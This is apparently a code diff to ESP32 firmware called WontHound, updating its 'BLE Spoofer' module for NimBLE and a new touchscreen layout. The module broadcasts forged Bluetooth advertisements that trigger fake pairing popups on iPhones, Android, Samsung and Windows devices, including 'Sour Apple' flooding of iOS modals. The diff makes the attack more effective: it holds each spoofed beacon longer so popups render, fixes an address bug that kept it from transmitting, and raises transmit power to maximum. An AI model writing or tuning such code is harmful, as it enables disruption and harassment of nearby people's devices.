@@ -8,16 +8,23 @@
 #include "shared.h"
 #include "touch_buttons.h"
 #include "utils.h"
+#include "wh_ui.h"
 #include "icon.h"
 #include "nrf24_config.h"
 #include <BLEDevice.h>
 #include <BLEAdvertising.h>
 #include <SPI.h>
-#include "esp_gap_ble_api.h"
-#include "esp_gatts_api.h"
-#include "esp_bt_main.h"
-#include "esp_bt.h"
-#include "esp_wifi.h"
+#include <esp_err.h>
+#include <esp_random.h>
+#include <esp_bt.h>
+#if defined(CONFIG_BLUEDROID_ENABLED)
+#include <esp_gap_ble_api.h>
+#include <esp_gatts_api.h>
+#include <esp_bt_main.h>
+#else
+#include <host/ble_gap.h>
+#endif
+#include <esp_wifi.h>
 #include <WiFi.h>
 #include "skull_bg.h"
 #include "ble_database.h"
@@ -25,23 +32,234 @@
 #include "spi_manager.h"
 #include "wp_loot_viewer.h"
 #include "gps_module.h"
+#include "radio_power_utils.h"
 
-// ── Classic BT memory release ───────────────────────────────────────────
-// ESP32 Bluedroid reserves ~28KB for Classic BT by default.
-// WontHound only uses BLE — release that memory once, permanently.
-// Must be called BEFORE BLEDevice::init() triggers esp_bt_controller_init().
+#if !defined(CONFIG_BLUEDROID_ENABLED)
+#ifndef BLE_ADDR_TYPE_PUBLIC
+#define BLE_ADDR_TYPE_PUBLIC BLE_ADDR_PUBLIC
+#endif
+#ifndef BLE_ADDR_TYPE_RANDOM
+#define BLE_ADDR_TYPE_RANDOM BLE_ADDR_RANDOM
+#endif
+#ifndef BLE_ADDR_TYPE_RPA_PUBLIC
+#define BLE_ADDR_TYPE_RPA_PUBLIC 2
+#endif
+#ifndef BLE_ADDR_TYPE_RPA_RANDOM
+#define BLE_ADDR_TYPE_RPA_RANDOM 3
+#endif
+#ifndef ADV_TYPE_IND
+#define ADV_TYPE_IND BLE_GAP_CONN_MODE_UND
+#endif
+#ifndef ADV_TYPE_NONCONN_IND
+#define ADV_TYPE_NONCONN_IND BLE_GAP_CONN_MODE_NON
+#endif
+#ifndef ADV_CHNL_ALL
+#define ADV_CHNL_ALL 0x07
+#endif
+#ifndef ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY
+#define ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY 0
+#endif
+#ifndef ESP_UUID_LEN_16
+#define ESP_UUID_LEN_16 2
+#define ESP_UUID_LEN_32 4
+#define ESP_UUID_LEN_128 16
+#endif
+#ifndef ESP_GATT_OK
+#define ESP_GATT_OK 0
+#endif
+#ifndef ESP_GATT_RSP_BY_APP
+#define ESP_GATT_RSP_BY_APP 1
+#endif
+
+typedef uint8_t esp_ble_addr_type_t;
+typedef int esp_gatt_status_t;
+typedef uint16_t esp_gatt_if_t;
+
+typedef struct {
+    uint16_t adv_int_min;
+    uint16_t adv_int_max;
+    uint8_t adv_type;
+    uint8_t own_addr_type;
+    uint8_t channel_map;
+    uint8_t adv_filter_policy;
+} esp_ble_adv_params_t;
+
+typedef struct {
+    uint16_t len;
+    union {
+        uint16_t uuid16;
+        uint32_t uuid32;
+        uint8_t uuid128[16];
+    } uuid;
+} esp_bt_uuid_t;
+
+typedef struct {
+    struct {
+        esp_bt_uuid_t uuid;
+        uint8_t inst_id;
+    } id;
+    bool is_primary;
+} esp_gatt_srvc_id_t;
+
+typedef struct {
+    uint8_t auto_rsp;
+} esp_attr_control_t;
+
+typedef struct {
+    struct {
+        uint16_t handle;
+        uint16_t len;
+        uint8_t value[64];
+    } attr_value;
+} esp_gatt_rsp_t;
+
+typedef enum {
+    ESP_GATTS_REG_EVT = 0,
+    ESP_GATTS_CREATE_EVT,
+    ESP_GATTS_START_EVT,
+    ESP_GATTS_ADD_CHAR_EVT,
+    ESP_GATTS_CONNECT_EVT,
+    ESP_GATTS_READ_EVT,
+    ESP_GATTS_WRITE_EVT,
+    ESP_GATTS_DISCONNECT_EVT,
+} esp_gatts_cb_event_t;
+
+typedef union {
+    struct { esp_gatt_status_t status; uint16_t app_id; } reg;
+    struct { esp_gatt_status_t status; uint16_t service_handle; } create;
+    struct { esp_gatt_status_t status; } start;
+    struct { esp_gatt_status_t status; uint16_t attr_handle; } add_char;
+    struct { uint16_t conn_id; esp_bd_addr_t remote_bda; } connect;
+    struct { uint16_t conn_id; uint32_t trans_id; uint16_t handle; } read;
+    struct { uint16_t conn_id; uint32_t trans_id; uint16_t handle; bool need_rsp; uint16_t len; uint8_t* value; } write;
+} esp_ble_gatts_cb_param_t;
+
+static esp_err_t esp_ble_gap_stop_advertising() {
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    if (adv) adv->stop();
+    return ESP_OK;
+}
+
+static esp_err_t esp_ble_gap_set_rand_addr(uint8_t* addr) {
+    if (!BLEDevice::getInitialized()) return ESP_ERR_INVALID_STATE;
+    // ── NimBLE byte-order fix ────────────────────────────────────────────────
+    // NimBLE's ble_hs_id_set_rnd() takes the address in LITTLE-ENDIAN (host
+    // byte order) and infers the random-address subtype from the MOST-
+    // significant byte, which is addr[5] — NOT addr[0]. A valid *static* random
+    // address must have the top two bits of addr[5] set to 0b11.
+    //
+    // All callers here set those bits on addr[0] (correct for the ORIGINAL
+    // Bluedroid esp_ble_gap_set_rand_addr, which is big-endian / MSB-first).
+    // On NimBLE that leaves addr[5] random, so ~75% of addresses are rejected
+    // with BLE_HS_EINVAL and advertising never starts — the device transmits
+    // nothing. Force the static-random bits on the real MSB here, on a local
+    // copy so the caller's buffer (used for logging / lastMAC) is untouched.
+    uint8_t rnd[6];
+    memcpy(rnd, addr, 6);
+    rnd[5] |= 0xC0;  // static random address: top 2 bits of the MSB = 0b11
+    // Set the random address FIRST, then select the random own-address type.
+    // ble_hs_id_copy_addr() (inside setOwnAddrType) needs a random address to
+    // already exist, and the own-addr-type must reflect the address we just set.
+    if (!BLEDevice::setOwnAddr(rnd)) return ESP_FAIL;
+    BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+    return ESP_OK;
+}
+
+static esp_err_t esp_ble_gap_config_adv_data_raw(uint8_t* data, uint32_t len) {
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    if (!adv || !data || len == 0) return ESP_FAIL;
+    BLEAdvertisementData advData;
+    advData.addData(std::string(reinterpret_cast<char*>(data), len));
+    return adv->setAdvertisementData(advData) ? ESP_OK : ESP_FAIL;
+}
+
+static esp_err_t esp_ble_gap_config_scan_rsp_data_raw(uint8_t* data, uint32_t len) {
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    if (!adv || !data || len == 0) return ESP_FAIL;
+    BLEAdvertisementData scanData;
+    scanData.addData(std::string(reinterpret_cast<char*>(data), len));
+    return adv->setScanResponseData(scanData) ? ESP_OK : ESP_FAIL;
+}
+
+static esp_err_t esp_ble_gap_start_advertising(esp_ble_adv_params_t* params) {
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    if (!adv) return ESP_FAIL;
+    if (params) {
+        adv->setAdvertisementType(params->adv_type == ADV_TYPE_IND ? BLE_GAP_CONN_MODE_UND : BLE_GAP_CONN_MODE_NON);
+        adv->setMinInterval(params->adv_int_min);
+        adv->setMaxInterval(params->adv_int_max);
+        adv->setScanResponse(params->adv_type == ADV_TYPE_IND);
+    }
+    return adv->start() ? ESP_OK : ESP_FAIL;
+}
+
+typedef void (*wonthound_gatts_handler_t)(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
+                                          esp_ble_gatts_cb_param_t* param);
+static esp_err_t esp_ble_gatts_register_callback(wonthound_gatts_handler_t) { return ESP_ERR_NOT_SUPPORTED; }
+static esp_err_t esp_ble_gatts_app_register(uint16_t) { return ESP_ERR_NOT_SUPPORTED; }
+static esp_err_t esp_ble_gatts_app_unregister(esp_gatt_if_t) { return ESP_ERR_NOT_SUPPORTED; }
+static esp_err_t esp_ble_gatts_create_service(esp_gatt_if_t, esp_gatt_srvc_id_t*, uint16_t) { return ESP_ERR_NOT_SUPPORTED; }
+static esp_err_t esp_ble_gatts_start_service(uint16_t) { return ESP_ERR_NOT_SUPPORTED; }
+static esp_err_t esp_ble_gatts_add_char(uint16_t, esp_bt_uuid_t*, esp_gatt_perm_t,
+                                        esp_gatt_char_prop_t, esp_attr_value_t*, esp_attr_control_t*) {
+    return ESP_ERR_NOT_SUPPORTED;
+}
+static esp_err_t esp_ble_gatts_send_response(esp_gatt_if_t, uint16_t, uint32_t, esp_gatt_status_t, esp_gatt_rsp_t*) {
+    return ESP_ERR_NOT_SUPPORTED;
+}
+#endif
+
+static void whCopyBleUuidForProfile(const BLEUUID& uuid, uint16_t& uuid16, uint8_t* uuid128) {
+    uuid16 = 0;
+    memset(uuid128, 0, 16);
+#if defined(CONFIG_BLUEDROID_ENABLED)
+    esp_bt_uuid_t* native = const_cast<BLEUUID&>(uuid).getNative();
+    if (native->len == ESP_UUID_LEN_16) {
+        uuid16 = native->uuid.uuid16;
+    } else if (native->len == ESP_UUID_LEN_128) {
+        memcpy(uuid128, native->uuid.uuid128, 16);
+    } else if (native->len == ESP_UUID_LEN_32) {
+        uuid16 = (uint16_t)(native->uuid.uuid32 & 0xFFFF);
+    }
+#elif defined(CONFIG_NIMBLE_ENABLED)
+    const ble_uuid_any_t* native = uuid.getNative();
+    if (native->u.type == BLE_UUID_TYPE_16) {
+        uuid16 = native->u16.value;
+    } else if (native->u.type == BLE_UUID_TYPE_128) {
+        memcpy(uuid128, native->u128.value, 16);
+    } else if (native->u.type == BLE_UUID_TYPE_32) {
+        uuid16 = (uint16_t)(native->u32.value & 0xFFFF);
+    }
+#endif
+}
+
+static std::string whToStdString(const String& value) {
+    return std::string(value.c_str(), value.length());
+}
+static std::string whToStdString(const std::string& value) {
+    return value;
+}
+
+// -- Classic BT memory release -------------------------------------------
+// Board-aware on purpose. ESP32-S3 is BLE-only, so releasing Classic BT
+// memory is a no-op there and can only make controller init harder to reason
+// about. Classic ESP32/Bluedroid builds may still reclaim the reserve before
+// BLEDevice::init().
 static bool g_classicBtReleased = false;
 static void releaseClassicBtMemory() {
+#if defined(ESP32S3_ES3C28P)
+    (void)g_classicBtReleased;
+#else
     if (!g_classicBtReleased) {
         esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
         if (err == ESP_OK) {
             g_classicBtReleased = true;
             Serial.printf("[BLE] Classic BT memory released OK, heap: %u\n", ESP.getFreeHeap());
         } else {
-            Serial.printf("[BLE] mem_release FAILED: 0x%x, heap: %u\n", err, ESP.getFreeHeap());
-            // Don't set flag — try again next time
+            Serial.printf("[BLE] mem_release skipped/failed: 0x%x, heap: %u\n", err, ESP.getFreeHeap());
         }
     }
+#endif
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -419,9 +637,9 @@ static volatile bool spamTaskRunning = false;
 // SCROLLING BROADCAST LOG
 // ═══════════════════════════════════════════════════════════════════════════
 
-#define SP_LOG_MAX_LINES 12
+#define SP_LOG_MAX_LINES 9
 #define SP_LOG_LINE_HEIGHT SCALE_H(12)
-#define SP_LOG_START_Y SCALE_Y(95)
+#define SP_LOG_START_Y SCALE_Y(122)   // below the taller MODE/DEVICE readout
 #define SP_LOG_END_Y (tft.height() - SCALE_H(80))
 
 static char logLines[SP_LOG_MAX_LINES][42];  // Fixed char buffers (no heap alloc)
@@ -516,7 +734,7 @@ static void getApplePopupPayload(BLEAdvertisementData& advData, int idx) {
     pkt[14] = 0x00;
     // Fill remaining 16 bytes with random data (makes each packet unique)
     esp_fill_random(&pkt[15], 16);
-    advData.addData(std::string((char*)pkt, 31));
+    advData.addData(std::string(reinterpret_cast<char*>(pkt), 31));
 }
 
 // Sour Apple Nearby Action (Type 0x0F) - floods iOS with action modals
@@ -539,7 +757,7 @@ static void getSourApplePayload(BLEAdvertisementData& advData, int typeIdx) {
     pkt[i++] = 0x10;
     // Random tail (3 bytes)
     esp_fill_random(&pkt[i], 3);
-    advData.addData(std::string((char*)pkt, 17));
+    advData.addData(std::string(reinterpret_cast<char*>(pkt), 17));
 }
 
 // Google Fast Pair (Service UUID 0xFE2C) - triggers Android pairing notification
@@ -564,7 +782,7 @@ static void getFastPairPayload(BLEAdvertisementData& advData, int idx) {
     pkt[i++] = model[0];
     pkt[i++] = model[1];
     pkt[i++] = model[2];
-    advData.addData(std::string((char*)pkt, 14));
+    advData.addData(std::string(reinterpret_cast<char*>(pkt), 14));
 }
 
 // Samsung Galaxy Buds (Company ID 0x0075) - triggers Samsung EasySetup popup
@@ -592,7 +810,7 @@ static void getSamsungBudsPayload(BLEAdvertisementData& advData, int idx) {
     // Fixed EasySetup tail (10 bytes)
     memcpy(&pkt[i], SAMSUNG_BUDS_TAIL, 10);
     i += 10;
-    advData.addData(std::string((char*)pkt, 31));
+    advData.addData(std::string(reinterpret_cast<char*>(pkt), 31));
 }
 
 // Samsung Galaxy Watch (Company ID 0x0075) - triggers Samsung Watch pairing popup
@@ -613,7 +831,7 @@ static void getSamsungWatchPayload(BLEAdvertisementData& advData, int idx) {
     i += 10;
     // Watch model ID (1 byte)
     pkt[i++] = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_COUNT];
-    advData.addData(std::string((char*)pkt, 18));
+    advData.addData(std::string(reinterpret_cast<char*>(pkt), 18));
 }
 
 // Microsoft Swift Pair (Company ID 0x0006) - triggers Windows "device found" popup
@@ -639,7 +857,7 @@ static void getSwiftPairPayload(BLEAdvertisementData& advData, int idx) {
     // Device name as ASCII
     memcpy(&pkt[i], name, nameLen);
     i += nameLen;
-    advData.addData(std::string((char*)pkt, i));
+    advData.addData(std::string(reinterpret_cast<char*>(pkt), i));
 }
 
 
@@ -685,65 +903,90 @@ static uint16_t spGradientColor(float ratio) {
     return tft.color565(r, g, b);
 }
 
-static void drawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-    for (int i = 0; i < SP_ICON_NUM; i++) {
-        uint16_t color = WONTHOUND_MAGENTA;
-        if (i == 1 && spamming) color = WONTHOUND_HOTPINK;  // Toggle icon hot when active
-        tft.drawBitmap(spIconX[i], ICON_BAR_Y, spIcons[i], SP_ICON_SIZE, SP_ICON_SIZE, color);
-    }
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+// ═══════════════════════════════════════════════════════════════════════════
+// REDESIGN (v2) — resistive-friendly: a FEW big, well-separated controls, all
+// kept clear of the fixed top-left Back zone (x<64,y<58). No crammed strip, no
+// scrolling mode-log. Two big MODE / DEVICE steppers + one huge START/STOP.
+// ═══════════════════════════════════════════════════════════════════════════
+static WhRect spModeL, spModeR, spDevL, spDevR, spStart;
+
+static void spComputeButtons() {
+    const int aw = 108, ah = 46;
+    spModeL = { 8,   64,  (int16_t)aw, (int16_t)ah };
+    spModeR = { 124, 64,  (int16_t)aw, (int16_t)ah };
+    spDevL  = { 8,   138, (int16_t)aw, (int16_t)ah };
+    spDevR  = { 124, 138, (int16_t)aw, (int16_t)ah };
+    spStart = { 8,   192, (int16_t)(SCREEN_WIDTH - 16), 92 };
 }
 
-static void drawHeader() {
-    tft.fillRect(0, SCALE_Y(40), SCREEN_WIDTH, SCALE_H(52), TFT_BLACK);
+// A big PREV/NEXT arrow button with a chunky triangle.
+static void spArrowBtn(const WhRect& r, bool left) {
+    tft.fillRoundRect(r.x, r.y, r.w, r.h, 8, WONTHOUND_DARK);
+    tft.drawRoundRect(r.x, r.y, r.w, r.h, 8, WONTHOUND_MAGENTA);
+    int cx = r.x + r.w / 2, cy = r.y + r.h / 2;
+    if (left) tft.fillTriangle(cx - 16, cy, cx + 8, cy - 15, cx + 8, cy + 15, WONTHOUND_HOTPINK);
+    else      tft.fillTriangle(cx + 16, cy, cx - 8, cy - 15, cx - 8, cy + 15, WONTHOUND_HOTPINK);
+}
 
-    // Skull watermark behind header (subtle dark cyan)
-    tft.drawBitmap(SCALE_X(180), SCALE_Y(40), bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));
-
-    // Title — Nosifer with glitch effect
-    drawGlitchText(SCALE_Y(60), "BLE SPOOFER", &Nosifer_Regular10pt7b);
-
-    // Status — pulsing when active
+// One selector row: a big centered name readout + PREV / NEXT arrows.
+static void spDrawSelector(const char* label, const char* value, const WhRect& L, const WhRect& R) {
+    int nameY = L.y - 24;
+    tft.fillRect(0, nameY, SCREEN_WIDTH, 22, WONTHOUND_BLACK);
+    tft.setTextFont(1);
     tft.setTextSize(1);
-    if (spamming) {
-        statusBlink = !statusBlink;
-        uint16_t statusColor = statusBlink ? WONTHOUND_HOTPINK : tft.color565(200, 50, 100);
-        tft.setTextColor(statusColor, TFT_BLACK);
-        tft.setCursor(SCALE_X(88), SCALE_Y(68));
-        tft.print(">> ACTIVE <<");
-    } else {
-        tft.setTextColor(WONTHOUND_GUNMETAL, TFT_BLACK);
-        tft.setCursor(SCALE_X(95), SCALE_Y(68));
-        tft.print("- IDLE -");
-    }
+    tft.setTextDatum(TL_DATUM);
+    tft.setTextColor(WONTHOUND_HOTPINK, WONTHOUND_BLACK);
+    tft.setCursor(10, nameY + 4);
+    tft.print(label);
+    tft.setTextSize(2);
+    tft.setTextDatum(MC_DATUM);
+    tft.setTextColor(WONTHOUND_MAGENTA, WONTHOUND_BLACK);
+    tft.drawString(value, SCREEN_WIDTH / 2 + 22, nameY + 8);
+    tft.setTextDatum(TL_DATUM);
+    spArrowBtn(L, true);
+    spArrowBtn(R, false);
+}
 
-    // Mode — in rounded double-border frame
-    tft.drawRoundRect(5, SCALE_Y(74), GRAPH_PADDED_W, SCALE_H(16), 3, WONTHOUND_VIOLET);
-    tft.drawRoundRect(6, SCALE_Y(75), GRAPH_PADDED_W - 2, SCALE_H(14), 2, WONTHOUND_GUNMETAL);
-    tft.setTextColor(WONTHOUND_MAGENTA, TFT_BLACK);
-    tft.setCursor(SCALE_X(10), SCALE_Y(78));
-    tft.printf(" %s", MODE_NAMES[currentMode]);
+// Huge primary START / STOP button (fills solid hot-pink while spamming).
+static void drawStartBtn() {
+    bool on = spamming;
+    uint16_t fill   = on ? WONTHOUND_HOTPINK : WONTHOUND_DARK;
+    uint16_t border = on ? TFT_WHITE : WONTHOUND_HOTPINK;
+    uint16_t fg     = on ? TFT_WHITE : WONTHOUND_HOTPINK;
+    tft.fillRoundRect(spStart.x, spStart.y, spStart.w, spStart.h, 12, fill);
+    tft.drawRoundRect(spStart.x, spStart.y, spStart.w, spStart.h, 12, border);
+    tft.drawRoundRect(spStart.x + 1, spStart.y + 1, spStart.w - 2, spStart.h - 2, 11, border);
+    int cx = spStart.x + spStart.w / 2, cy = spStart.y + spStart.h / 2;
+    tft.setTextFont(2);
+    tft.setTextSize(2);
+    tft.setTextDatum(MC_DATUM);
+    tft.setTextColor(fg);
+    tft.drawString(on ? "STOP" : "START", cx, cy);
+    tft.setTextDatum(TL_DATUM);
+}
 
-    // Device name + platform target on right side of frame
+// Header band ("< Back" pill + title + GPS) plus the huge START/STOP button.
+// (Called on setup / start / stop — where the spam state changes.)
+static void drawIconBar() {
+    whDrawHeaderBand("BLE SPOOFER");
+    drawStartBtn();
+}
+
+// The two big selectors (MODE + DEVICE), each a readout + PREV/NEXT arrows.
+static void drawHeader() {
+    spDrawSelector("MODE", MODE_NAMES[currentMode], spModeL, spModeR);
+
+    char devBuf[18];
     if (currentMode == MODE_CHAOS) {
-        tft.setCursor(SCALE_X(150), SCALE_Y(78));
-        tft.setTextColor(WONTHOUND_HOTPINK, TFT_BLACK);
-        tft.print("[ALL]");
+        snprintf(devBuf, sizeof(devBuf), "[ALL]");
     } else {
         int devCount = getDeviceCount(currentMode);
-        if (devCount > 0) {
-            // Truncate device name to fit
-            char devBuf[22];
+        if (devCount > 0)
             snprintf(devBuf, sizeof(devBuf), "%s", getDeviceName(currentMode, deviceIndex[currentMode]));
-            tft.setCursor(SCALE_X(130), SCALE_Y(78));
-            tft.setTextColor(WONTHOUND_VIOLET, TFT_BLACK);
-            tft.print(devBuf);
-        }
+        else
+            snprintf(devBuf, sizeof(devBuf), "--");
     }
-
-    tft.drawLine(0, SCALE_Y(92), SCREEN_WIDTH, SCALE_Y(92), WONTHOUND_HOTPINK);
+    spDrawSelector("DEVICE", devBuf, spDevL, spDevR);
 }
 
 static void addLogEntry(const char* text, uint16_t color) {
@@ -1033,108 +1276,116 @@ static esp_ble_adv_params_t bleSpamAdvParams = {
 // BROADCAST ENGINE
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Re-send each fake device (same MAC + payload) this many times before rotating.
+// A one-shot ~20ms advert gets de-duped as RF noise by Windows/Android; holding
+// the same beacon for ~12 cycles (~250ms) gives them a stable target long enough
+// to actually render the pairing popup. Then rotate to a fresh device.
+#define BS_ADV_REPEATS 12
+
 static void doBroadcast() {
-    // ═══════════════════════════════════════════════════════════════════════
-    // BLE BROADCAST — Raw ESP-IDF API (Arduino wrapper doesn't cycle MACs correctly)
-    // Sequence: stop → setRandAddr → configDataRaw → start → delay → stop
-    // ═══════════════════════════════════════════════════════════════════════
+    static uint8_t  heldAddr[6];
+    static uint8_t  heldPayload[64];
+    static uint32_t heldLen = 0;
+    static int      heldMode = 0, heldIdx = 0;
+    static int      repeatsLeft = 0;
 
-    // Stop any current advertising
-    esp_ble_gap_stop_advertising();
+    if (repeatsLeft <= 0) {
+        // ── Rotate: pick a NEW random MAC + mode + device + payload, then hold ──
+        esp_fill_random(heldAddr, 6);
+        heldAddr[0] |= 0xC0;  // BLE random static address (top 2 bits = 0b11)
 
-    // Generate random BLE MAC address
-    esp_bd_addr_t addr;
-    esp_fill_random(addr, 6);
-    addr[0] |= 0xC0;  // Set top 2 bits for BLE random static address type
-
-    // Set random address via raw ESP-IDF (wrapper doesn't handle rapid cycling)
-    esp_ble_gap_set_rand_addr(addr);
-
-    // Determine what to broadcast
-    int broadcastMode = currentMode;
-    int broadcastIdx = 0;
-    const char* deviceName = "";
-
-    if (currentMode == MODE_CHAOS) {
-        broadcastMode = chaosStep % (MODE_COUNT - 1);
-        int count = getDeviceCount(broadcastMode);
-        broadcastIdx = (count > 0) ? random(count) : 0;
-        chaosStep++;
-    } else {
-        broadcastIdx = deviceIndex[currentMode];
-    }
-
-    // Build payload
-    BLEAdvertisementData advData = BLEAdvertisementData();
-
-    switch (broadcastMode) {
-        case MODE_APPLE_POPUP:
-            getApplePopupPayload(advData, broadcastIdx);
-            deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
-            break;
-
-        case MODE_SOUR_APPLE: {
-            int randType = random(SOUR_APPLE_COUNT);
-            getSourApplePayload(advData, randType);
-            deviceName = SOUR_APPLE_NAMES[randType];
-            break;
+        int broadcastMode = currentMode;
+        int broadcastIdx = 0;
+        const char* deviceName = "";
+        if (currentMode == MODE_CHAOS) {
+            broadcastMode = chaosStep % (MODE_COUNT - 1);
+            int count = getDeviceCount(broadcastMode);
+            broadcastIdx = (count > 0) ? random(count) : 0;
+            chaosStep++;
+        } else {
+            int count = getDeviceCount(currentMode);
+            broadcastIdx = (count > 0) ? random(count) : 0;
         }
 
-        case MODE_FAST_PAIR:
-            getFastPairPayload(advData, broadcastIdx);
-            deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
-            break;
+        BLEAdvertisementData advData = BLEAdvertisementData();
+        switch (broadcastMode) {
+            case MODE_APPLE_POPUP:
+                getApplePopupPayload(advData, broadcastIdx);
+                deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
+                break;
+            case MODE_SOUR_APPLE: {
+                int randType = random(SOUR_APPLE_COUNT);
+                getSourApplePayload(advData, randType);
+                deviceName = SOUR_APPLE_NAMES[randType];
+                break;
+            }
+            case MODE_FAST_PAIR:
+                getFastPairPayload(advData, broadcastIdx);
+                deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
+                break;
+            case MODE_SAMSUNG_BUDS:
+                getSamsungBudsPayload(advData, broadcastIdx);
+                deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
+                break;
+            case MODE_SAMSUNG_WATCH:
+                getSamsungWatchPayload(advData, broadcastIdx);
+                deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
+                break;
+            case MODE_SWIFT_PAIR:
+                getSwiftPairPayload(advData, broadcastIdx);
+                deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
+                break;
+            default:
+                return;
+        }
 
-        case MODE_SAMSUNG_BUDS:
-            getSamsungBudsPayload(advData, broadcastIdx);
-            deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
-            break;
+        std::string payload = advData.getPayload();
+        heldLen = payload.length();
+        if (heldLen > sizeof(heldPayload)) heldLen = sizeof(heldPayload);
+        memcpy(heldPayload, payload.c_str(), heldLen);
+        heldMode = broadcastMode;
+        heldIdx = broadcastIdx;
+        repeatsLeft = BS_ADV_REPEATS;
 
-        case MODE_SAMSUNG_WATCH:
-            getSamsungWatchPayload(advData, broadcastIdx);
-            deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
-            break;
-
-        case MODE_SWIFT_PAIR:
-            getSwiftPairPayload(advData, broadcastIdx);
-            deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
-            break;
-
-        default:
-            return;
+        char logBuf[42];
+        snprintf(logBuf, sizeof(logBuf), "[+] %s -> %02X:%02X:%02X",
+                 deviceName, heldAddr[0], heldAddr[1], heldAddr[2]);
+        addLogEntry(logBuf, WONTHOUND_VIOLET);
     }
 
-    // Set raw advertising data via ESP-IDF (bypasses Arduino wrapper for reliable cycling)
-    std::string payload = advData.getPayload();
-    esp_ble_gap_config_adv_data_raw((uint8_t*)payload.data(), payload.length());
-
-    // Brief pause for data config to take effect
-    delay(1);
-
-    // Start advertising with raw ESP-IDF params (proven pattern from ESP32-BLE-Spam)
-    esp_ble_gap_start_advertising(&bleSpamAdvParams);
-
-    // Let BLE controller fire advertising events on channels 37/38/39
-    // 20ms = at least one full advertising interval
-    delay(20);
-
-    // Stop advertising (clean cycle for next random MAC)
+    // ── (Re)advertise the currently-held fake device ──
     esp_ble_gap_stop_advertising();
+    esp_err_t addrErr = esp_ble_gap_set_rand_addr(heldAddr);
+    esp_err_t cfgErr  = esp_ble_gap_config_adv_data_raw(heldPayload, heldLen);
+    delay(1);
+    esp_err_t advErr  = esp_ble_gap_start_advertising(&bleSpamAdvParams);
 
-    // Update counters
+#if CYD_DEBUG
+    static uint32_t _lastTxLog = 0;
+    if ((addrErr != ESP_OK || cfgErr != ESP_OK || advErr != ESP_OK || heldLen == 0)
+        && (millis() - _lastTxLog > 1000)) {
+        Serial.printf("[BLESPOOF] TX FAIL addr=0x%x cfg=0x%x adv=0x%x len=%u heap=%u init=%d\n",
+                      (int)addrErr, (int)cfgErr, (int)advErr, (unsigned)heldLen,
+                      (unsigned)esp_get_free_heap_size(), (int)BLEDevice::getInitialized());
+        _lastTxLog = millis();
+    } else if (millis() - _lastTxLog > 2000) {
+        Serial.printf("[BLESPOOF] TX ok mode=%d dev=%d len=%u rpt=%d heap=%u\n",
+                      heldMode, heldIdx, (unsigned)heldLen, repeatsLeft,
+                      (unsigned)esp_get_free_heap_size());
+        _lastTxLog = millis();
+    }
+#endif
+
+    delay(20);  // hold on-air ~one adv interval so 37/38/39 all fire
+    esp_ble_gap_stop_advertising();
+    repeatsLeft--;
+
     packetCount++;
     rateWindowCount++;
-
-    // Log first 5 packets to serial for debugging
     if (packetCount <= 5) {
         Serial.printf("[BLESPOOF] TX #%lu mode=%d len=%d addr=%02X:%02X:%02X\n",
-            packetCount, broadcastMode, (int)payload.length(), addr[0], addr[1], addr[2]);
+                      packetCount, heldMode, (int)heldLen, heldAddr[0], heldAddr[1], heldAddr[2]);
     }
-
-    // Log entry with truncated MAC (all stack-allocated, zero heap allocs)
-    char logBuf[42];
-    snprintf(logBuf, sizeof(logBuf), "[+] %s -> %02X:%02X:%02X", deviceName, addr[0], addr[1], addr[2]);
-    addLogEntry(logBuf, WONTHOUND_VIOLET);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1202,10 +1453,8 @@ static void stopSpamTask() {
 static void startSpam() {
     spamming = true;
     rateWindowCount = 0;
-    addLogEntry("[!] SPAM STARTED", WONTHOUND_HOTPINK);
-    drawIconBar();
-    drawHeader();
-    drawLog();  // Force immediate log display on state change
+    drawIconBar();     // repaint START (now STOP, solid pink)
+    drawHeader();      // selectors repaint (arrows stay live during spam)
 
     startSpamTask();  // Launch Core 0 broadcast engine
 
@@ -1216,8 +1465,7 @@ static void startSpam() {
 
 static void stopSpam() {
     stopSpamTask();  // Stop Core 0 task first
-    addLogEntry("[!] SPAM STOPPED", WONTHOUND_HOTPINK);
-    drawIconBar();
+    drawIconBar();     // repaint STOP -> START
     drawHeader();
 
     #if CYD_DEBUG
@@ -1254,11 +1502,11 @@ void setup() {
 
     // Initialize BLE — must wait for controller to be fully ready before setting TX power
     releaseClassicBtMemory();
-    BLEDevice::init("WontHound");
+    wh_ble_init_max_power("WontHound");
     delay(150);  // BLE controller needs time to finish internal init
 
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
